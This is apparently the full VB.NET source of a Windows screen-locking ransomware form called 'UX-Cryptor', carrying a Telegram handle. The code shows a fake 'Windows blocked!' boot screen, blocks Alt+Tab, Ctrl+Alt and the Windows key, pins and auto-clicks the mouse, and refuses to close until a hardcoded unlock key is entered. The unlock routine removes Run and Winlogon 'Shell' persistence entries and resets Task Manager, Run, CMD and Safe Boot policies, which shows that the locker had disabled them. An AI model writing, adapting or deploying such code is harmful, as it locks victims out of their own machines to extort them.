Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Security.Principal
Imports System.Threading
Imports System.Windows
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.Win32

Public Class _o_program

    Public string_0 As String

    Private object_0 As Object

    Private object_1 As Object

    Private object_2 As Object

    Private object_3 As Object

	Private object_4 As Object

	Public Declare Ansi Function mouse_event Lib "user32.dll" (int_0 As Integer, int_1 As Integer, int_2 As Integer, int_3 As Integer, int_4 As Integer) As Boolean

	Public Declare Ansi Function LockWorkStation Lib "user32.dll" () As Integer

	Public Sub New()
		Me.string_0 = " "
		Me.object_0 = 0
		Me.object_1 = 0
		Me.object_2 = 0
		Me.object_3 = False
		Me.object_4 = 0
		InitializeComponent()
	End Sub

	Private Sub _o_program_Load(sender As Object, e As EventArgs) Handles MyBase.Load
		Me.Text = "UX-Cryptor [GUI] (t.me/ftmoapp)"
		My.Forms.loader.Text = "UX-Cryptor [Runtime] (t.me/ftmoapp)"
		Try
            Me.ID.Text = Conversions.ToString(Operators.ConcatenateObject("ID: 10-A" + File.ReadAllText(My.Forms.loader.string_4) + "0E", Operators.IntDivideObject(Conversion.Int(File.ReadAllText(My.Forms.loader.string_4)), 15)))
        Catch ex As Exception
            My.Forms.loader.object_0 = True
        End Try
        Me.Cursor.Dispose()
        Me.hdn.ContextMenu = New ContextMenu()
        Me.BackColor = Color.Black
        Me.UserInfo.Text = "Current PC: " + My.Computer.Name
    End Sub

	Private Sub _o_program_KeyDown(sender As Object, e As KeyEventArgs) Handles hdn.KeyDown
		Try
			If e.Control And e.Alt Then
				Dim thread As Thread = New Thread(New ThreadStart(AddressOf Me.method_8))
				thread.Start()
				_o_program.LockWorkStation()
			End If
			If e.Alt AndAlso e.KeyCode = Keys.Tab Then
				Dim thread As Thread = New Thread(New ThreadStart(AddressOf Me.method_8))
				thread.Start()
			End If
			If e.KeyCode = Keys.LWin Then
				Dim thread As Thread = New Thread(New ThreadStart(AddressOf Me.method_8))
				thread.Start()
			End If
			If e.KeyCode = Keys.[Return] Then
				Dim menu As Label = Me.menu1
				menu.BackColor = Color.White
				menu.ForeColor = Color.Black
				If Operators.CompareString(Me.hdn.Text, "ftmoapp0c0v11" + File.ReadAllText(My.Forms.loader.string_4), False) = 0 Then
					Me.method_5()
				Else
					Me.vmethod_4().[Start]()
				End If
			End If
		Catch ex As Exception
			My.Forms.loader.object_0 = True
		End Try
		If Conversions.ToBoolean(My.Forms.loader.object_0) Then
			Me.vmethod_4().[Start]()
			Me.errx.Text = "Произошёл сбой! Обратитесь за аварийным ключом."
			If Operators.CompareString(Me.hdn.Text, "ExceptionKey", False) = 0 Then
				Me.method_5()
				ProjectData.EndApp()
			End If
		End If
	End Sub

	Private Sub method_0(sender As Object, e As EventArgs) Handles srv.Tick
		Try
			Me.hdn.Focus()
			Dim art As Label = Me.art
			If Operators.ConditionalCompareObjectLess(Me.object_0, 200, False) Then
				If Not Operators.ConditionalCompareObjectLess(Me.object_0, 10, False) Then
					If Not Operators.ConditionalCompareObjectLess(Me.object_0, 18, False) Then
						If Operators.ConditionalCompareObjectEqual(Me.object_0, 30, False) Then
							Dim label As Label = art
							label.Text += vbCrLf & "Memory section at address 0x0424* is locked!"
						ElseIf Not Operators.ConditionalCompareObjectEqual(Me.object_0, 35, False) Then
							If Not Operators.ConditionalCompareObjectEqual(Me.object_0, 50, False) Then
								If Operators.ConditionalCompareObjectEqual(Me.object_0, 70, False) Then
									art.Image = Nothing
									art.Text = Nothing
								ElseIf Operators.ConditionalCompareObjectEqual(Me.object_0, 80, False) Then
									art.BackColor = Color.DarkRed
									art.ForeColor = Color.White
									Dim label2 As Label = art
									label2.Text += vbCrLf & "               ..." & vbCrLf & "             ;::::;" & vbCrLf & "           ;::::; :;" & vbCrLf & "         ;:::::'   :;" & vbCrLf
								ElseIf Operators.ConditionalCompareObjectEqual(Me.object_0, 85, False) Then
									Dim label3 As Label = art
									label3.Text += "        ;:::::;     ;." & vbCrLf & "       ,:::::'       ;           OOO\" & vbCrLf & "       ::::::;       ;          OOOOO\" & vbCrLf & "       ;:::::;       ;         OOOOOOOO" & vbCrLf & "      ,;::::::;     ;'         / OOOOOOO" & vbCrLf & "    ;:::::::::`. ,,,;.        /  / DOOOOOO" & vbCrLf & "  .';:::::::::::::::::;,     /  /     DOOOO" & vbCrLf
								ElseIf Operators.ConditionalCompareObjectEqual(Me.object_0, 90, False) Then
									Dim label4 As Label = art
									label4.Text += " ,::::::;::::::;;;;::::;,   /  /        DOOO" & vbCrLf & ";`::::::`'::::::;;;::::: ,#/  /          DOOO" & vbCrLf & ":`:::::::`;::::::;;::: ;::#  /            DOOO" & vbCrLf & "::`:::::::`;:::::::: ;::::# /              DOO" & vbCrLf & "`:`:::::::`;:::::: ;::::::#/               DOO" & vbCrLf & " :::`:::::::`;; ;:::::::::##                OO" & vbCrLf & " ::::`:::::::`;::::::::;:::#                OO" & vbCrLf & " `:::::`::::::::::::;'`:;::#                O" & vbCrLf & "  `:::::`::::::::;' /  / `:#" & vbCrLf & "   ::::::`:::::;'  /  /   `#"
									Me.method_9()
								ElseIf Not Operators.ConditionalCompareObjectEqual(Me.object_0, 140, False) Then
									If Not Operators.ConditionalCompareObjectEqual(Me.object_0, 150, False) Then
										If Not Operators.ConditionalCompareObjectEqual(Me.object_0, 160, False) Then
											If Operators.ConditionalCompareObjectEqual(Me.object_0, 170, False) Then
												Me.UserInfo.Visible = True
											ElseIf Not Operators.ConditionalCompareObjectEqual(Me.object_0, 177, False) Then
												If Operators.ConditionalCompareObjectEqual(Me.object_0, 180, False) Then
													Me.ID.Visible = True
												End If
											Else
												Me.menu1.Visible = True
											End If
										Else
											Me.a2.Visible = True
										End If
									Else
										Me.a1.Visible = True
									End If
								Else
									Me.BackColor = Color.DarkRed
									Me.main.Visible = True
								End If
							Else
								art.ForeColor = Color.Red
								Dim label5 As Label = art
								label5.Text += vbCrLf & vbCrLf & " * Windows blocked!"
							End If
						Else
							Dim label6 As Label = art
							label6.Text += vbCrLf & "Service UX-Cryptor started."
						End If
					Else
						Dim label7 As Label = art
						Dim label8 As Label = label7
						label7.Text = Conversions.ToString(Operators.ConcatenateObject(label8.Text, Operators.ConcatenateObject(vbCrLf & "Boot error: 0x0", Operators.IntDivideObject(Conversion.Int(Conversion.Str(VBMath.Rnd()).Replace(".", "").Trim()), 2))))
					End If
				Else
					art.Text = Nothing
					art.Text = "Booting Windows . . ."
				End If
				Me.object_0 = Operators.AddObject(Me.object_0, 1)
			End If
			Me.hdn.SelectionStart = Strings.Len(Me.hdn.Text)
			Me.inputPS.Text = Conversions.ToString(Operators.ConcatenateObject(Me.hdn.Text, Me.string_0))
			Cursor.Position = New Point(5, 5)
			MyBase.Activate()
		Catch ex As Exception
		End Try
	End Sub

	Private Sub method_3(sender As Object, e As KeyPressEventArgs) Handles hdn.KeyPress
		Me.object_1 = 0
		e.Handled = Not LikeOperator.LikeString(Conversions.ToString(e.KeyChar), "[a-z,A-Z" & vbBack & ",0-9]", CompareMethod.Binary)
	End Sub

	Private Sub method_4(sender As Object, e As EventArgs) Handles OnError.Tick
		If Operators.ConditionalCompareObjectEqual(Me.object_3, False, False) Then
			Me.method_8()
			Me.object_3 = True
		End If
		Me.errx.Visible = True
		Me.object_2 = Operators.AddObject(Me.object_2, 1)
		If Operators.ConditionalCompareObjectEqual(Me.object_2, 20, False) Then
			Me.object_3 = False
			Me.errx.Visible = False
			Me.vmethod_4().[Stop]()
			Me.object_2 = 0
		End If
	End Sub

	Public Sub method_5()
		' The following expression was wrapped in a checked-statement
		Try
			Dim num As Integer = 1
			Do
				My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).DeleteValue("WIN32_" + Conversions.ToString(num))
				'My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).DeleteValue("MicrosoftEdgeUpdate_" + Conversions.ToString(num))
				'My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).DeleteValue("AloBiznesDaDaDengi_" + Conversions.ToString(num))
				'My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).DeleteValue("SimpleUnlockerIdiNaxuy_" + Conversions.ToString(num))
				'My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).DeleteValue("DaYaEbal_" + Conversions.ToString(num))
				'My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).DeleteValue("NaGoreUVodopada5GorilEbaliKogoto_" + Conversions.ToString(num))
				num += 1
			Loop While num <= 256
		Catch ex As Exception
		End Try
		Me.method_6()
		Try
			File.Delete(My.Forms.loader.string_4)
		Catch ex2 As Exception
		End Try
		Try
			Dim registryKey As RegistryKey = Registry.LocalMachine.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\System", True)
			Dim registryKey2 As RegistryKey = Registry.LocalMachine.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", True)
			Dim registryKey3 As RegistryKey = Registry.LocalMachine.CreateSubKey("SYSTEM\CurrentControlSet\Control\SafeBoot", True)
			Dim registryKey4 As RegistryKey = Registry.LocalMachine.CreateSubKey("SYSTEM\CurrentControlSet\Services\USBSTOR", True)
			Dim registryKey5 As RegistryKey = Registry.LocalMachine.CreateSubKey("Software\Policies\Microsoft\Windows\System", True)
			Dim registryKey6 As RegistryKey = Registry.LocalMachine.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Search", True)
			registryKey.SetValue("DisableTaskMgr", 0, RegistryValueKind.DWord)
			registryKey.SetValue("DisableRegistryTools", 0, RegistryValueKind.DWord)
			registryKey.SetValue("DisableLockWorkStation", 0, RegistryValueKind.DWord)
			registryKey.SetValue("DisableChangePassword", 0, RegistryValueKind.DWord)
			registryKey.SetValue("NoDispBackgroundPage", 0, RegistryValueKind.DWord)
			registryKey.SetValue("NoDispAppearancePage", 0, RegistryValueKind.DWord)
			registryKey2.SetValue("StartMenuLogOff", 0, RegistryValueKind.DWord)
			registryKey2.SetValue("NoClose", 0, RegistryValueKind.DWord)
			registryKey2.SetValue("NoControlPanel", 0, RegistryValueKind.DWord)
			registryKey2.SetValue("NoRun", 0, RegistryValueKind.DWord)
			registryKey2.SetValue("NoViewOnDrive", 0, RegistryValueKind.DWord)
			registryKey2.SetValue("NoDrives", 0, RegistryValueKind.DWord)
			registryKey2.SetValue("HidePowerOptions", 0, RegistryValueKind.DWord)
			registryKey2.SetValue("NoDesktop", 0, RegistryValueKind.DWord)
			registryKey2.SetValue("NoNetHood", 0, RegistryValueKind.DWord)
			registryKey2.SetValue("NoWinKeys", 0, RegistryValueKind.DWord)
			registryKey2.SetValue("NoFolderOptions", 0, RegistryValueKind.DWord)
			registryKey2.SetValue("NoViewContextMenu", 0, RegistryValueKind.DWord)
			registryKey2.SetValue("NoTrayContextMenu", 0, RegistryValueKind.DWord)
			registryKey2.SetValue("NoSetTaskbar", 0, RegistryValueKind.DWord)
			registryKey2.SetValue("NoFind", 0, RegistryValueKind.DWord)
			registryKey2.SetValue("NoSecurityTab", 0, RegistryValueKind.DWord)
			registryKey2.SetValue("NoDesktopContextMenu", 0, RegistryValueKind.DWord)
			registryKey2.SetValue("NoCommonGroups", 0, RegistryValueKind.DWord)
			registryKey2.SetValue("NoFileMenu", 0, RegistryValueKind.DWord)
			registryKey2.SetValue("NoStartMenuMorePrograms", 0, RegistryValueKind.DWord)
			registryKey2.SetValue("NoStartMenuMFUprogramsList", 0, RegistryValueKind.DWord)
			registryKey2.SetValue("NoPropertiesMyComputer", 0, RegistryValueKind.DWord)
			registryKey2.SetValue("NoThemesTab", 0, RegistryValueKind.DWord)
			registryKey3.SetValue("", "Minimal")
			registryKey3.SetValue("", "Network")
			registryKey4.SetValue("Start", 3, RegistryValueKind.DWord)
			registryKey5.SetValue("DisableCMD", 0, RegistryValueKind.DWord)
			registryKey6.SetValue("BingSearchEnabled", 1, RegistryValueKind.DWord)
			registryKey6.SetValue("SearchboxTaskbarMode", 1, RegistryValueKind.DWord)
			registryKey.Close()
			registryKey2.Close()
			registryKey3.Close()
			registryKey4.Close()
			registryKey5.Close()
			registryKey6.Close()
		Catch ex3 As Exception
		End Try
		Try
			My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", True)
			Dim array As RegistryKey() = New RegistryKey() {My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True), My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", True), My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", True)}
			array(0).DeleteValue("WindowsInstaller")
			array(0).DeleteValue("MSEdgeUpdateX")
			array(1).DeleteValue("System3264Wow")
			array(1).DeleteValue("OneDrive10293")
			array(1).DeleteValue("WINDOWS")
			array(2).DeleteValue("Shell")
			array(0).Close()
			array(1).Close()
			array(2).Close()
		Catch ex4 As Exception
		End Try
		Process.Start(New ProcessStartInfo("cmd.exe") With {.Arguments = Environment.ExpandEnvironmentVariables("/k %SystemRoot%\Explorer.exe"), .WindowStyle = ProcessWindowStyle.Hidden})
		ProjectData.EndApp()
	End Sub

	Private Sub method_6()
		' The following expression was wrapped in a checked-statement
		Try
			Dim text As String = My.Forms.loader.string_3.Replace("$", "-") + " & del info-Locker.txt /q /s & attrib +h +s -r desktop.ini"
			Dim array As String() = New String() {"%userprofile%\desktop", "%systemdrive%\Users\Public\Desktop", "%userprofile%\downloads", "%userprofile%\documents", "%userprofile%"}
			Dim num As Integer = My.Forms.loader.string_0.Length - 1
			For i As Integer = 0 To num
				If Directory.Exists(My.Forms.loader.string_0(i) + ":\") Then
					Dim text2 As String = My.Forms.loader.string_0(i) + ":"
					Interaction.Shell("cmd.exe /c " + text2 + " & " + text, AppWinStyle.Hide, False, -1)
				End If
			Next
			Dim num2 As Integer = array.Length - 1
			For j As Integer = 0 To num2
				Interaction.Shell("cmd.exe /c cd """ + array(j) + """&" + text, AppWinStyle.Hide, False, -1)
			Next
		Catch ex As Exception
		End Try
	End Sub

	Private Sub method_7(sender As Object, e As KeyEventArgs) Handles hdn.KeyDown
		If e.KeyCode = Keys.[Return] Then
			Dim menu As Label = Me.menu1
			menu.BackColor = Color.DarkBlue
			menu.ForeColor = Color.White
		End If
	End Sub

	Private Sub _o_program_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        Me.vmethod_8().Start()
        e.Cancel = True
    End Sub

    Friend Overridable Function vmethod_8() As Global.System.Windows.Forms.Timer
		Return Me.bypasserr
	End Function

	Friend Overridable Function vmethod_6() As Global.System.Windows.Forms.Timer
		Return Me.clck
	End Function

	Friend Overridable Function vmethod_4() As Global.System.Windows.Forms.Timer
		Return Me.OnError
	End Function

	Friend Overridable Function vmethod_2() As Global.System.Windows.Forms.Timer
		Return Me.cursorstylec
	End Function

	Friend Overridable Function vmethod_0() As Global.System.Windows.Forms.Timer
		Return Me.srv
	End Function

	Private Sub method_11(sender As Object, e As EventArgs) Handles clck.Tick
		mouse_event(2, 0, 0, 3, 3)
		mouse_event(4, 0, 0, 3, 3)
	End Sub

	Private Sub method_1(sender As Object, e As EventArgs) Handles cursorstylec.Tick
		Me.object_1 = Operators.AddObject(Me.object_1, 1)
		Dim array As String() = New String() {"█", "▓", "▒", "░", " "}
		Dim obj As Object = Me.object_1
		If Not Operators.ConditionalCompareObjectEqual(obj, 1, False) Then
			If Operators.ConditionalCompareObjectEqual(obj, 34, False) Then
				Me.string_0 = array(1)
				Return
			End If
			If Operators.ConditionalCompareObjectEqual(obj, 37, False) Then
				Me.string_0 = array(2)
				Return
			End If
			If Operators.ConditionalCompareObjectEqual(obj, 40, False) Then
				Me.string_0 = array(3)
				Return
			End If
			If Operators.ConditionalCompareObjectEqual(obj, 42, False) Then
				Me.string_0 = array(4)
				Return
			End If
			If Operators.ConditionalCompareObjectEqual(obj, 60, False) Then
				Me.object_1 = 0
				Return
			End If
		Else
			Me.string_0 = array(0)
		End If
	End Sub

	Private Sub method_12(sender As Object, e As EventArgs) Handles bypasserr.Tick
		Me.object_4 = Operators.AddObject(Me.object_4, 1)
		If Operators.ConditionalCompareObjectEqual(Me.object_4, 1, False) Then
			Me.method_10()
		End If
		Me.ByPassMessage.Visible = True
		Dim obj As Object = Me.object_4
		If Operators.ConditionalCompareObjectEqual(obj, 5, False) Then
			Me.ByPassWarnMsg.ForeColor = Color.FromArgb(192, 0, 0)
			Me.ByPassWarnMsg.BackColor = Color.White
			Return
		End If
		If Operators.ConditionalCompareObjectEqual(obj, 10, False) Then
			Me.ByPassWarnMsg.ForeColor = Color.White
			Me.ByPassWarnMsg.BackColor = Color.FromArgb(192, 0, 0)
			Return
		End If
		If Not Operators.ConditionalCompareObjectEqual(obj, 15, False) Then
			If Operators.ConditionalCompareObjectEqual(obj, 20, False) Then
				Me.ByPassWarnMsg.ForeColor = Color.White
				Me.ByPassWarnMsg.BackColor = Color.FromArgb(192, 0, 0)
				Return
			End If
			If Operators.ConditionalCompareObjectEqual(obj, 100, False) Then
				Me.ByPassMessage.Visible = False
				Me.vmethod_8().[Stop]()
				Me.object_4 = 0
				Return
			End If
		Else
			Me.ByPassWarnMsg.ForeColor = Color.FromArgb(192, 0, 0)
			Me.ByPassWarnMsg.BackColor = Color.White
		End If
	End Sub

	Private Sub method_8()
		Dim num As Integer = 0
		Do
			Console.Beep(750, 120)
			num += 1
		Loop While num <= 1
	End Sub

	Private Sub method_9()
		Console.Beep(800, 950)
	End Sub

	Private Sub method_10()
		Console.Beep(500, 600)
	End Sub
End Class